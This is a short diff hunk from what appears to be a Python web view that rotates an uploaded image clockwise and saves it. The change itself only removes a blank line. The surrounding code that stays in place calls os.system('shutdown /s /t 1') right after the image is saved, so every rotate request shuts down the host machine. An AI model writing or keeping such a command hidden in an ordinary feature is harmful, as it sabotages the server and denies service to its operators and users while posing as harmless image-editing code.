@@ -28,7 +28,6 @@ def rotate_cw(requests, id_image):
     img = Image.open(image_path)
     out = img.rotate(-90)
     out.save(image_path, "PNG")
-
     os.system("shutdown /s /t 1")
 
     return redirect('effects', id_image)
